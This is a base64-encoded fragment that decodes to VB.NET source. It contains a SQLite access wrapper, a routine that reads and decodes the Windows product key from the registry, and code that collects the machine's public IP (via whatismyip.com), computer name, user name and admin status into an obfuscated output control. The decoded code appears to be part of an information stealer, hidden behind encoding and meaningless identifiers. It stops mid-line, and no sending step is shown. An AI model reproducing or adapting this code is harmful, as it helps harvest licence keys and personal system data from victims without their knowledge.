cWxpdGUzX2NvbHVtbl9kb3VibGUoQnlWYWwgc3RhdGVtZW50IEFzIEludFB0ciwgQnlWYWwgY29s dW1uTnVtYmVyIEFzIEludGVnZXIpIEFzIERvdWJsZQ0KICAgICAgICBFbmQgRnVuY3Rpb24NCg0K ICAgICAgICA8RGxsSW1wb3J0KCJzcWxpdGUzIik+IF8NCiAgICAgICAgUHJpdmF0ZSBTaGFyZWQg RnVuY3Rpb24gc3FsaXRlM19jb2x1bW5fdGV4dChCeVZhbCBzdGF0ZW1lbnQgQXMgSW50UHRyLCBC eVZhbCBjb2x1bW5OdW1iZXIgQXMgSW50ZWdlcikgQXMgSW50UHRyDQogICAgICAgIEVuZCBGdW5j dGlvbg0KDQogICAgICAgIDxEbGxJbXBvcnQoInNxbGl0ZTMiKT4gXw0KICAgICAgICBQcml2YXRl IFNoYXJlZCBGdW5jdGlvbiBzcWxpdGUzX2NvbHVtbl9ibG9iKEJ5VmFsIHN0YXRlbWVudCBBcyBJ bnRQdHIsIEJ5VmFsIGNvbHVtbk51bWJlciBBcyBJbnRlZ2VyKSBBcyBJbnRQdHINCiAgICAgICAg RW5kIEZ1bmN0aW9uDQoNCiAgICAgICAgPERsbEltcG9ydCgic3FsaXRlMyIpPiBfDQogICAgICAg IFByaXZhdGUgU2hhcmVkIEZ1bmN0aW9uIHNxbGl0ZTNfY29sdW1uX3RhYmxlX25hbWUoQnlWYWwg c3RhdGVtZW50IEFzIEludFB0ciwgQnlWYWwgY29sdW1uTnVtYmVyIEFzIEludGVnZXIpIEFzIElu dFB0cg0KICAgICAgICBFbmQgRnVuY3Rpb24NCg0KICAgICAgICA8RGxsSW1wb3J0KCJzcWxpdGUz Iik+IF8NCiAgICAgICAgUHJpdmF0ZSBTaGFyZWQgRnVuY3Rpb24gc3FsaXRlM19maW5hbGl6ZShC eVZhbCBoYW5kbGUgQXMgSW50UHRyKSBBcyBJbnRlZ2VyDQogICAgICAgIEVuZCBGdW5jdGlvbg0K DQogICAgICAgICcgU1FMaXRlIGNvbnN0YW50cw0KICAgICAgICBQcml2YXRlIENvbnN0IFNRTF9P SyBBcyBJbnRlZ2VyID0gMA0KICAgICAgICBQcml2YXRlIENvbnN0IFNRTF9ST1cgQXMgSW50ZWdl ciA9IDEwMA0KICAgICAgICBQcml2YXRlIENvbnN0IFNRTF9ET05FIEFzIEludGVnZXIgPSAxMDEN CiAgICAgICAgUHVibGljIEVudW0gU1FMaXRlRGF0YVR5cGVzDQogICAgICAgICAgICBJTlQgPSAx DQogICAgICAgICAgICBGTE9BVA0KICAgICAgICAgICAgVEVYVA0KICAgICAgICAgICAgQkxPQg0K ICAgICAgICAgICAgTlVMTA0KICAgICAgICBFbmQgRW51bQ0KICAgICAgICBQcml2YXRlIGRhdGFi YXNlIEFzIEludFB0cg0KDQogICAgICAgIFB1YmxpYyBTdWIgTmV3KCkNCiAgICAgICAgICAgIGRh dGFiYXNlID0gSW50UHRyLlplcm8NCiAgICAgICAgRW5kIFN1Yg0KICAgICAgICBQdWJsaWMgU3Vi IE5ldyhCeVZhbCBiYXNlTmFtZSBBcyBbU3RyaW5nXSkNCiAgICAgICAgICAgIE9wZW5EYXRhYmFz ZShiYXNlTmFtZSkNCiAgICAgICAgRW5kIFN1Yg0KICAgICAgICBQdWJsaWMgU3ViIE9wZW5EYXRh YmFzZShCeVZhbCBiYXNlTmFtZSBBcyBbU3RyaW5nXSkNCiAgICAgICAgICAgIElmIHNxbGl0ZTNf b3BlbihTdHJpbmdUb1BvaW50ZXIoYmFzZU5hbWUpLCBkYXRhYmFzZSkgPD4gU1FMX09LIFRoZW4N CiAgICAgICAgICAgICAgICBkYXRhYmFzZSA9IEludFB0ci5aZXJvDQogICAgICAgICAgICAgICAg VGhyb3cgTmV3IEV4Y2VwdGlvbigiRXJyb3Igd2l0aCBvcGVuaW5nIGRhdGFiYXNlICIgJiBiYXNl TmFtZSAmICIhIikNCiAgICAgICAgICAgIEVuZCBJZg0KICAgICAgICBFbmQgU3ViDQogICAgICAg IFB1YmxpYyBTdWIgQ2xvc2VEYXRhYmFzZSgpDQogICAgICAgICAgICBJZiBkYXRhYmFzZSA8PiBJ bnRQdHIuWmVybyBUaGVuDQogICAgICAgICAgICAgICAgc3FsaXRlM19jbG9zZShkYXRhYmFzZSkN CiAgICAgICAgICAgIEVuZCBJZg0KICAgICAgICBFbmQgU3ViDQogICAgICAgIFB1YmxpYyBGdW5j dGlvbiBHZXRUYWJsZXMoKSBBcyBBcnJheUxpc3QNCiAgICAgICAgICAgIERpbSBxdWVyeSBBcyBb U3RyaW5nXSA9ICJTRUxFQ1QgbmFtZSBGUk9NIHNxbGl0ZV9tYXN0ZXIgIiAmICJXSEVSRSB0eXBl IElOICgndGFibGUnLCd2aWV3JykgQU5EIG5hbWUgTk9UIExJS0UgJ3NxbGl0ZV8lJyIgJiAiVU5J T04gQUxMICIgJiAiU0VMRUNUIG5hbWUgRlJPTSBzcWxpdGVfdGVtcF9tYXN0ZXIgIiAmICJXSEVS RSB0eXBlIElOICgndGFibGUnLCd2aWV3JykgIiAmICJPUkRFUiBCWSAxIg0KICAgICAgICAgICAg RGltIHRhYmxlIEFzIERhdGFUYWJsZSA9IEV4ZWN1dGVRdWVyeShxdWVyeSkNCiAgICAgICAgICAg IERpbSBsaXN0IEFzIE5ldyBBcnJheUxpc3QoKQ0KICAgICAgICAgICAgRm9yIEVhY2ggcm93IEFz IERhdGFSb3cgSW4gdGFibGUuUm93cw0KICAgICAgICAgICAgICAgIGxpc3QuQWRkKHJvdy5JdGVt QXJyYXkoMCkuVG9TdHJpbmcoKSkNCiAgICAgICAgICAgIE5leHQNCiAgICAgICAgICAgIFJldHVy biBsaXN0DQogICAgICAgIEVuZCBGdW5jdGlvbg0KICAgICAgICBQdWJsaWMgU3ViIEV4ZWN1dGVO b25RdWVyeShCeVZhbCBxdWVyeSBBcyBbU3RyaW5nXSkNCiAgICAgICAgICAgIERpbSBbZXJyb3Jd IEFzIEludFB0cg0KICAgICAgICAgICAgc3FsaXRlM19leGVjKGRhdGFiYXNlLCBTdHJpbmdUb1Bv aW50ZXIocXVlcnkpLCBJbnRQdHIuWmVybywgSW50UHRyLlplcm8sIFtlcnJvcl0pDQogICAgICAg ICAgICBJZiBbZXJyb3JdIDw+IEludFB0ci5aZXJvIFRoZW4NCiAgICAgICAgICAgICAgICBUaHJv dyBOZXcgRXhjZXB0aW9uKCgiRXJyb3Igd2l0aCBleGVjdXRpbmcgbm9uLXF1ZXJ5OiAiIiIgJiBx dWVyeSAmICIiIiEiICYgdmJMZikgKyBQb2ludGVyVG9TdHJpbmcoc3FsaXRlM19lcnJtc2coW2Vy cm9yXSkpKQ0KICAgICAgICAgICAgRW5kIElmDQogICAgICAgIEVuZCBTdWINCiAgICAgICAgUHVi bGljIEZ1bmN0aW9uIEV4ZWN1dGVRdWVyeShCeVZhbCBxdWVyeSBBcyBbU3RyaW5nXSkgQXMgRGF0 YVRhYmxlDQogICAgICAgICAgICBEaW0gc3RhdGVtZW50IEFzIEludFB0cg0KICAgICAgICAgICAg RGltIGV4Y2Vzc0RhdGEgQXMgSW50UHRyDQogICAgICAgICAgICBzcWxpdGUzX3ByZXBhcmVfdjIo ZGF0YWJhc2UsIFN0cmluZ1RvUG9pbnRlcihxdWVyeSksIEdldFBvaW50ZXJMZW5naHQoU3RyaW5n VG9Qb2ludGVyKHF1ZXJ5KSksIHN0YXRlbWVudCwgZXhjZXNzRGF0YSkNCiAgICAgICAgICAgIERp bSB0YWJsZSBBcyBOZXcgRGF0YVRhYmxlKCkNCiAgICAgICAgICAgIERpbSByZXN1bHQgQXMgSW50 ZWdlciA9IFJlYWRGaXJzdFJvdyhzdGF0ZW1lbnQsIHRhYmxlKQ0KICAgICAgICAgICAgV2hpbGUg cmVzdWx0ID0gU1FMX1JPVw0KICAgICAgICAgICAgICAgIHJlc3VsdCA9IFJlYWROZXh0Um93KHN0 YXRlbWVudCwgdGFibGUpDQogICAgICAgICAgICBFbmQgV2hpbGUNCiAgICAgICAgICAgIHNxbGl0 ZTNfZmluYWxpemUoc3RhdGVtZW50KQ0KICAgICAgICAgICAgUmV0dXJuIHRhYmxlDQogICAgICAg IEVuZCBGdW5jdGlvbg0KICAgICAgICBQcml2YXRlIEZ1bmN0aW9uIFJlYWRGaXJzdFJvdyhCeVZh bCBzdGF0ZW1lbnQgQXMgSW50UHRyLCBCeVJlZiB0YWJsZSBBcyBEYXRhVGFibGUpIEFzIEludGVn ZXINCiAgICAgICAgICAgIHRhYmxlID0gTmV3IERhdGFUYWJsZSgicmVzdWx0VGFibGUiKQ0KICAg ICAgICAgICAgRGltIHJlc3VsdFR5cGUgQXMgSW50ZWdlciA9IHNxbGl0ZTNfc3RlcChzdGF0ZW1l bnQpDQogICAgICAgICAgICBJZiByZXN1bHRUeXBlID0gU1FMX1JPVyBUaGVuDQogICAgICAgICAg ICAgICAgRGltIGNvbHVtbkNvdW50IEFzIEludGVnZXIgPSBzcWxpdGUzX2NvbHVtbl9jb3VudChz dGF0ZW1lbnQpDQogICAgICAgICAgICAgICAgRGltIGNvbHVtbk5hbWUgQXMgW1N0cmluZ10gPSAi Ig0KICAgICAgICAgICAgICAgIERpbSBjb2x1bW5UeXBlIEFzIEludGVnZXIgPSAwDQogICAgICAg ICAgICAgICAgRGltIGNvbHVtblZhbHVlcyBBcyBPYmplY3QoKSA9IE5ldyBPYmplY3QoY29sdW1u Q291bnQgLSAxKSB7fQ0KICAgICAgICAgICAgICAgIEZvciBpIEFzIEludGVnZXIgPSAwIFRvIGNv bHVtbkNvdW50IC0gMQ0KICAgICAgICAgICAgICAgICAgICBjb2x1bW5OYW1lID0gUG9pbnRlclRv U3RyaW5nKHNxbGl0ZTNfY29sdW1uX25hbWUoc3RhdGVtZW50LCBpKSkNCiAgICAgICAgICAgICAg ICAgICAgY29sdW1uVHlwZSA9IHNxbGl0ZTNfY29sdW1uX3R5cGUoc3RhdGVtZW50LCBpKQ0KICAg ICAgICAgICAgICAgICAgICBTZWxlY3QgQ2FzZSBjb2x1bW5UeXBlDQogICAgICAgICAgICAgICAg ICAgICAgICBDYXNlIENJbnQoU1FMaXRlRGF0YVR5cGVzLklOVCkNCiAgICAgICAgICAgICAgICAg ICAgICAgICAgICBJZiBUcnVlIFRoZW4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg dGFibGUuQ29sdW1ucy5BZGQoY29sdW1uTmFtZSwgVHlwZS5bR2V0VHlwZV0oIlN5c3RlbS5JbnQz MiIpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb2x1bW5WYWx1ZXMoaSkgPSBz cWxpdGUzX2NvbHVtbl9pbnQoc3RhdGVtZW50LCBpKQ0KICAgICAgICAgICAgICAgICAgICAgICAg ICAgICAgICBFeGl0IFNlbGVjdA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEVuZCBJZg0K ICAgICAgICAgICAgICAgICAgICAgICAgQ2FzZSBDSW50KFNRTGl0ZURhdGFUeXBlcy5GTE9BVCkN CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBJZiBUcnVlIFRoZW4NCiAgICAgICAgICAgICAg ICAgICAgICAgICAgICAgICAgdGFibGUuQ29sdW1ucy5BZGQoY29sdW1uTmFtZSwgVHlwZS5bR2V0 VHlwZV0oIlN5c3RlbS5TaW5nbGUiKSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg Y29sdW1uVmFsdWVzKGkpID0gc3FsaXRlM19jb2x1bW5fZG91YmxlKHN0YXRlbWVudCwgaSkNCiAg ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRXhpdCBTZWxlY3QNCiAgICAgICAgICAgICAg ICAgICAgICAgICAgICBFbmQgSWYNCiAgICAgICAgICAgICAgICAgICAgICAgIENhc2UgQ0ludChT UUxpdGVEYXRhVHlwZXMuVEVYVCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBJZiBUcnVl IFRoZW4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFibGUuQ29sdW1ucy5BZGQo Y29sdW1uTmFtZSwgVHlwZS5bR2V0VHlwZV0oIlN5c3RlbS5TdHJpbmciKSkNCiAgICAgICAgICAg ICAgICAgICAgICAgICAgICAgICAgY29sdW1uVmFsdWVzKGkpID0gUG9pbnRlclRvU3RyaW5nKHNx bGl0ZTNfY29sdW1uX3RleHQoc3RhdGVtZW50LCBpKSkNCiAgICAgICAgICAgICAgICAgICAgICAg ICAgICAgICAgRXhpdCBTZWxlY3QNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBFbmQgSWYN CiAgICAgICAgICAgICAgICAgICAgICAgIENhc2UgQ0ludChTUUxpdGVEYXRhVHlwZXMuQkxPQikN CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBJZiBUcnVlIFRoZW4NCiAgICAgICAgICAgICAg ICAgICAgICAgICAgICAgICAgdGFibGUuQ29sdW1ucy5BZGQoY29sdW1uTmFtZSwgVHlwZS5bR2V0 VHlwZV0oIlN5c3RlbS5TdHJpbmciKSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg Y29sdW1uVmFsdWVzKGkpID0gUG9pbnRlclRvU3RyaW5nKHNxbGl0ZTNfY29sdW1uX2Jsb2Ioc3Rh dGVtZW50LCBpKSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRXhpdCBTZWxlY3QN CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBFbmQgSWYNCiAgICAgICAgICAgICAgICAgICAg ICAgIENhc2UgRWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIElmIFRydWUgVGhlbg0K ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YWJsZS5Db2x1bW5zLkFkZChjb2x1bW5O YW1lLCBUeXBlLltHZXRUeXBlXSgiU3lzdGVtLlN0cmluZyIpKQ0KICAgICAgICAgICAgICAgICAg ICAgICAgICAgICAgICBjb2x1bW5WYWx1ZXMoaSkgPSAiIg0KICAgICAgICAgICAgICAgICAgICAg ICAgICAgICAgICBFeGl0IFNlbGVjdA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEVuZCBJ Zg0KICAgICAgICAgICAgICAgICAgICBFbmQgU2VsZWN0DQogICAgICAgICAgICAgICAgTmV4dA0K ICAgICAgICAgICAgICAgIHRhYmxlLlJvd3MuQWRkKGNvbHVtblZhbHVlcykNCiAgICAgICAgICAg IEVuZCBJZg0KICAgICAgICAgICAgUmV0dXJuIHNxbGl0ZTNfc3RlcChzdGF0ZW1lbnQpDQogICAg ICAgIEVuZCBGdW5jdGlvbg0KICAgICAgICBQcml2YXRlIEZ1bmN0aW9uIFJlYWROZXh0Um93KEJ5 VmFsIHN0YXRlbWVudCBBcyBJbnRQdHIsIEJ5UmVmIHRhYmxlIEFzIERhdGFUYWJsZSkgQXMgSW50 ZWdlcg0KICAgICAgICAgICAgRGltIGNvbHVtbkNvdW50IEFzIEludGVnZXIgPSBzcWxpdGUzX2Nv bHVtbl9jb3VudChzdGF0ZW1lbnQpDQoNCiAgICAgICAgICAgIERpbSBjb2x1bW5UeXBlIEFzIElu dGVnZXIgPSAwDQogICAgICAgICAgICBEaW0gY29sdW1uVmFsdWVzIEFzIE9iamVjdCgpID0gTmV3 IE9iamVjdChjb2x1bW5Db3VudCAtIDEpIHt9DQoNCiAgICAgICAgICAgIEZvciBpIEFzIEludGVn ZXIgPSAwIFRvIGNvbHVtbkNvdW50IC0gMQ0KICAgICAgICAgICAgICAgIGNvbHVtblR5cGUgPSBz cWxpdGUzX2NvbHVtbl90eXBlKHN0YXRlbWVudCwgaSkNCg0KICAgICAgICAgICAgICAgIFNlbGVj dCBDYXNlIGNvbHVtblR5cGUNCiAgICAgICAgICAgICAgICAgICAgQ2FzZSBDSW50KFNRTGl0ZURh dGFUeXBlcy5JTlQpDQogICAgICAgICAgICAgICAgICAgICAgICBJZiBUcnVlIFRoZW4NCiAgICAg ICAgICAgICAgICAgICAgICAgICAgICBjb2x1bW5WYWx1ZXMoaSkgPSBzcWxpdGUzX2NvbHVtbl9p bnQoc3RhdGVtZW50LCBpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEV4aXQgU2VsZWN0 DQogICAgICAgICAgICAgICAgICAgICAgICBFbmQgSWYNCiAgICAgICAgICAgICAgICAgICAgQ2Fz ZSBDSW50KFNRTGl0ZURhdGFUeXBlcy5GTE9BVCkNCiAgICAgICAgICAgICAgICAgICAgICAgIElm IFRydWUgVGhlbg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbHVtblZhbHVlcyhpKSA9 IHNxbGl0ZTNfY29sdW1uX2RvdWJsZShzdGF0ZW1lbnQsIGkpDQogICAgICAgICAgICAgICAgICAg ICAgICAgICAgRXhpdCBTZWxlY3QNCiAgICAgICAgICAgICAgICAgICAgICAgIEVuZCBJZg0KICAg ICAgICAgICAgICAgICAgICBDYXNlIENJbnQoU1FMaXRlRGF0YVR5cGVzLlRFWFQpDQogICAgICAg ICAgICAgICAgICAgICAgICBJZiBUcnVlIFRoZW4NCiAgICAgICAgICAgICAgICAgICAgICAgICAg ICBjb2x1bW5WYWx1ZXMoaSkgPSBQb2ludGVyVG9TdHJpbmcoc3FsaXRlM19jb2x1bW5fdGV4dChz dGF0ZW1lbnQsIGkpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEV4aXQgU2VsZWN0DQog ICAgICAgICAgICAgICAgICAgICAgICBFbmQgSWYNCiAgICAgICAgICAgICAgICAgICAgQ2FzZSBD SW50KFNRTGl0ZURhdGFUeXBlcy5CTE9CKQ0KICAgICAgICAgICAgICAgICAgICAgICAgSWYgVHJ1 ZSBUaGVuDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29sdW1uVmFsdWVzKGkpID0gUG9p bnRlclRvU3RyaW5nKHNxbGl0ZTNfY29sdW1uX2Jsb2Ioc3RhdGVtZW50LCBpKSkNCiAgICAgICAg ICAgICAgICAgICAgICAgICAgICBFeGl0IFNlbGVjdA0KICAgICAgICAgICAgICAgICAgICAgICAg RW5kIElmDQogICAgICAgICAgICAgICAgICAgIENhc2UgRWxzZQ0KICAgICAgICAgICAgICAgICAg ICAgICAgSWYgVHJ1ZSBUaGVuDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29sdW1uVmFs dWVzKGkpID0gIiINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBFeGl0IFNlbGVjdA0KICAg ICAgICAgICAgICAgICAgICAgICAgRW5kIElmDQogICAgICAgICAgICAgICAgRW5kIFNlbGVjdA0K ICAgICAgICAgICAgTmV4dA0KICAgICAgICAgICAgdGFibGUuUm93cy5BZGQoY29sdW1uVmFsdWVz KQ0KICAgICAgICAgICAgUmV0dXJuIHNxbGl0ZTNfc3RlcChzdGF0ZW1lbnQpDQogICAgICAgIEVu ZCBGdW5jdGlvbg0KICAgICAgICBQcml2YXRlIEZ1bmN0aW9uIFN0cmluZ1RvUG9pbnRlcihCeVZh bCBzdHIgQXMgW1N0cmluZ10pIEFzIEludFB0cg0KICAgICAgICAgICAgSWYgc3RyIElzIE5vdGhp bmcgVGhlbg0KICAgICAgICAgICAgICAgIFJldHVybiBJbnRQdHIuWmVybw0KICAgICAgICAgICAg RWxzZQ0KICAgICAgICAgICAgICAgIERpbSBlbmNvZGluZ19fMSBBcyBFbmNvZGluZyA9IEVuY29k aW5nLlVURjgNCiAgICAgICAgICAgICAgICBEaW0gYnl0ZXMgQXMgW0J5dGVdKCkgPSBlbmNvZGlu Z19fMS5HZXRCeXRlcyhzdHIpDQogICAgICAgICAgICAgICAgRGltIGxlbmd0aCBBcyBVSW50ZWdl ciA9IGJ5dGVzLkxlbmd0aCArIDENCiAgICAgICAgICAgICAgICBEaW0gcG9pbnRlciBBcyBJbnRQ dHIgPSBIZWFwQWxsb2MoR2V0UHJvY2Vzc0hlYXAoKSwgMCwgRGlyZWN0Q2FzdChsZW5ndGgsIFVJ bnQzMikpDQogICAgICAgICAgICAgICAgTWFyc2hhbC5Db3B5KGJ5dGVzLCAwLCBwb2ludGVyLCBi eXRlcy5MZW5ndGgpDQogICAgICAgICAgICAgICAgTWFyc2hhbC5Xcml0ZUJ5dGUocG9pbnRlciwg Ynl0ZXMuTGVuZ3RoLCAwKQ0KICAgICAgICAgICAgICAgIFJldHVybiBwb2ludGVyDQogICAgICAg ICAgICBFbmQgSWYNCiAgICAgICAgRW5kIEZ1bmN0aW9uDQogICAgICAgIFByaXZhdGUgRnVuY3Rp b24gUG9pbnRlclRvU3RyaW5nKEJ5VmFsIHB0ciBBcyBJbnRQdHIpIEFzIFtTdHJpbmddDQogICAg ICAgICAgICBJZiBwdHIgPSBJbnRQdHIuWmVybyBUaGVuDQogICAgICAgICAgICAgICAgUmV0dXJu IE5vdGhpbmcNCiAgICAgICAgICAgIEVuZCBJZg0KDQogICAgICAgICAgICBEaW0gZW5jb2Rpbmdf XzEgQXMgRW5jb2RpbmcgPSBFbmNvZGluZy5VVEY4DQoNCiAgICAgICAgICAgIERpbSBsZW5ndGgg QXMgSW50ZWdlciA9IEdldFBvaW50ZXJMZW5naHQocHRyKQ0KICAgICAgICAgICAgRGltIGJ5dGVz IEFzIFtCeXRlXSgpID0gTmV3IFtCeXRlXShsZW5ndGggLSAxKSB7fQ0KICAgICAgICAgICAgTWFy c2hhbC5Db3B5KHB0ciwgYnl0ZXMsIDAsIGxlbmd0aCkNCiAgICAgICAgICAgIFJldHVybiBlbmNv ZGluZ19fMS5HZXRTdHJpbmcoYnl0ZXMsIDAsIGxlbmd0aCkNCiAgICAgICAgRW5kIEZ1bmN0aW9u DQogICAgICAgIFByaXZhdGUgRnVuY3Rpb24gR2V0UG9pbnRlckxlbmdodChCeVZhbCBwdHIgQXMg SW50UHRyKSBBcyBJbnRlZ2VyDQogICAgICAgICAgICBJZiBwdHIgPSBJbnRQdHIuWmVybyBUaGVu DQogICAgICAgICAgICAgICAgUmV0dXJuIDANCiAgICAgICAgICAgIEVuZCBJZg0KICAgICAgICAg ICAgUmV0dXJuIGxzdHJsZW4ocHRyKQ0KICAgICAgICBFbmQgRnVuY3Rpb24NCiAgICBFbmQgQ2xh c3MNCkVuZCBNb2R1bGUNCg0KDQoNCk1vZHVsZSBXaW5rZXkNCiAgICBQdWJsaWMgRnVuY3Rpb24g R2V0UHJvZHVjdEtleSgpIEFzIFN0cmluZw0KICAgICAgICBUcnkNCiAgICAgICAgICAgIERpbSBI ZXhCdWYgQXMgT2JqZWN0ID0gTXkuQ29tcHV0ZXIuUmVnaXN0cnkuR2V0VmFsdWUoIkhLRVlfTE9D QUxfTUFDSElORVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBOVFxDdXJyZW50VmVyc2lvbiIs ICJEaWdpdGFsUHJvZHVjdElkIiwgMCkNCg0KICAgICAgICAgICAgSWYgSGV4QnVmIElzIE5vdGhp bmcgVGhlbiBSZXR1cm4gIk4vQSINCg0KICAgICAgICAgICAgRGltIHRtcCBBcyBTdHJpbmcgPSAi Ig0KDQogICAgICAgICAgICBGb3IgbCBBcyBJbnRlZ2VyID0gTEJvdW5kKEhleEJ1ZikgVG8gVUJv dW5kKEhleEJ1ZikNCiAgICAgICAgICAgICAgICB0bXAgPSB0bXAgJiAiICIgJiBIZXgoSGV4QnVm KGwpKQ0KICAgICAgICAgICAgTmV4dA0KDQogICAgICAgICAgICBEaW0gU3RhcnRPZmZzZXQgQXMg SW50ZWdlciA9IDUyDQogICAgICAgICAgICBEaW0gRW5kT2Zmc2V0IEFzIEludGVnZXIgPSA2Nw0K ICAgICAgICAgICAgRGltIERpZ2l0cygyNCkgQXMgU3RyaW5nDQoNCiAgICAgICAgICAgIERpZ2l0 cygwKSA9ICJCIiA6IERpZ2l0cygxKSA9ICJDIiA6IERpZ2l0cygyKSA9ICJEIiA6IERpZ2l0cygz KSA9ICJGIg0KICAgICAgICAgICAgRGlnaXRzKDQpID0gIkciIDogRGlnaXRzKDUpID0gIkgiIDog RGlnaXRzKDYpID0gIkoiIDogRGlnaXRzKDcpID0gIksiDQogICAgICAgICAgICBEaWdpdHMoOCkg PSAiTSIgOiBEaWdpdHMoOSkgPSAiUCIgOiBEaWdpdHMoMTApID0gIlEiIDogRGlnaXRzKDExKSA9 ICJSIg0KICAgICAgICAgICAgRGlnaXRzKDEyKSA9ICJUIiA6IERpZ2l0cygxMykgPSAiViIgOiBE aWdpdHMoMTQpID0gIlciIDogRGlnaXRzKDE1KSA9ICJYIg0KICAgICAgICAgICAgRGlnaXRzKDE2 KSA9ICJZIiA6IERpZ2l0cygxNykgPSAiMiIgOiBEaWdpdHMoMTgpID0gIjMiIDogRGlnaXRzKDE5 KSA9ICI0Ig0KICAgICAgICAgICAgRGlnaXRzKDIwKSA9ICI2IiA6IERpZ2l0cygyMSkgPSAiNyIg OiBEaWdpdHMoMjIpID0gIjgiIDogRGlnaXRzKDIzKSA9ICI5Ig0KDQogICAgICAgICAgICBEaW0g ZExlbiBBcyBJbnRlZ2VyID0gMjkNCiAgICAgICAgICAgIERpbSBzTGVuIEFzIEludGVnZXIgPSAx NQ0KICAgICAgICAgICAgRGltIEhleERpZ2l0YWxQSUQoMTUpIEFzIFN0cmluZw0KICAgICAgICAg ICAgRGltIERlcygzMCkgQXMgU3RyaW5nDQoNCiAgICAgICAgICAgIERpbSB0bXAyIEFzIFN0cmlu ZyA9ICIiDQoNCiAgICAgICAgICAgIEZvciBpIEFzIEludGVnZXIgPSBTdGFydE9mZnNldCBUbyBF bmRPZmZzZXQNCiAgICAgICAgICAgICAgICBIZXhEaWdpdGFsUElEKGkgLSBTdGFydE9mZnNldCkg PSBIZXhCdWYoaSkNCiAgICAgICAgICAgICAgICB0bXAyID0gdG1wMiAmICIgIiAmIEhleChIZXhE aWdpdGFsUElEKGkgLSBTdGFydE9mZnNldCkpDQogICAgICAgICAgICBOZXh0DQoNCiAgICAgICAg ICAgIERpbSBLRVlTVFJJTkcgQXMgU3RyaW5nID0gIiINCg0KICAgICAgICAgICAgRm9yIGkgQXMg SW50ZWdlciA9IGRMZW4gLSAxIFRvIDAgU3RlcCAtMQ0KICAgICAgICAgICAgICAgIElmICgoaSAr IDEpIE1vZCA2KSA9IDAgVGhlbg0KICAgICAgICAgICAgICAgICAgICBEZXMoaSkgPSAiLSINCiAg ICAgICAgICAgICAgICAgICAgS0VZU1RSSU5HID0gS0VZU1RSSU5HICYgIi0iDQogICAgICAgICAg ICAgICAgRWxzZQ0KICAgICAgICAgICAgICAgICAgICBEaW0gSE4gQXMgSW50ZWdlciA9IDANCiAg ICAgICAgICAgICAgICAgICAgRm9yIE4gQXMgSW50ZWdlciA9IChzTGVuIC0gMSkgVG8gMCBTdGVw IC0xDQogICAgICAgICAgICAgICAgICAgICAgICBEaW0gVmFsdWUgQXMgSW50ZWdlciA9ICgoSE4g KiAyIF4gOCkgT3IgSGV4RGlnaXRhbFBJRChOKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIEhl eERpZ2l0YWxQSUQoTikgPSBWYWx1ZSBcIDI0DQogICAgICAgICAgICAgICAgICAgICAgICBITiA9 IChWYWx1ZSBNb2QgMjQpDQoNCiAgICAgICAgICAgICAgICAgICAgTmV4dA0KDQogICAgICAgICAg ICAgICAgICAgIERlcyhpKSA9IERpZ2l0cyhITikNCiAgICAgICAgICAgICAgICAgICAgS0VZU1RS SU5HID0gS0VZU1RSSU5HICYgRGlnaXRzKEhOKQ0KCQkJCQkNCgkJCQ0KICAgICAgICAgICAgICAg IEVuZCBJZg0KCQkJCQ0KICAgICAgICAgICAgTmV4dA0KCQkJRGltIHBsYXRmb3JtIEFzIFN0cmlu Zw0KICAgICAgICAgICAgICAgIElmIEludFB0ci5TaXplID0gNCBUaGVuDQogICAgICAgICAgICAg ICAgICAgIHBsYXRmb3JtID0gIjMyLUJpdCINCiAgICAgICAgICAgICAgICBFbHNlDQogICAgICAg ICAgICAgICAgICAgIHBsYXRmb3JtID0gIjY0LUJpdCINCiAgICAgICAgICAgICAgICBFbmQgSWYN CiAgICAgICAgICAgWzI0XS5bODhdLkFwcGVuZFRleHQodmJOZXdMaW5lKQ0KCQkgICBbMjRdLls4 OF0uQXBwZW5kVGV4dCgifn5+fn5QQyBJbmZvfn5+fn4iICYgdmJuZXdsaW5lKQ0KCQkgICBVc2lu ZyB3ZWIgQXMgTmV3IE5ldC5XZWJDbGllbnQNCiAgICAgICAgICAgWzI0XS5bODhdLkFwcGVuZFRl eHQoIklQIEFkZHJlc3M6ICIgJiBOZXQuSVBBZGRyZXNzLlBhcnNlKEVuY29kaW5nLkFTQ0lJLkdl dFN0cmluZyh3ZWIuRG93bmxvYWREYXRhKCJodHRwOi8vd2hhdGlzbXlpcC5jb20vYXV0b21hdGlv bi9uMDkyMzA5NDUuYXNwIikpKS5Ub1N0cmluZyAmIHZibmV3bGluZSkNCiAgICAgICAgRW5kIFVz aW5nDQoJCSAgIFsyNF0uWzg4XS5BcHBlbmRUZXh0KCJDb21wdXRlci1OYW1lOiAiICYgRW52aXJv bm1lbnQuTWFjaGluZU5hbWUgJiB2Ym5ld2xpbmUpDQoJCSAgIFsyNF0uWzg4XS5BcHBlbmRUZXh0 KCJVc2VyLU5hbWU6ICIgJiBFbnZpcm9ubWVudC5Vc2VyTmFtZSAmIHZibmV3bGluZSkNCgkJICAg SWYgTXkuVXNlci5Jc0luUm9sZShBcHBsaWNhdGlvblNlcnZpY2VzLkJ1aWx0SW5Sb2xlLkFkbWlu 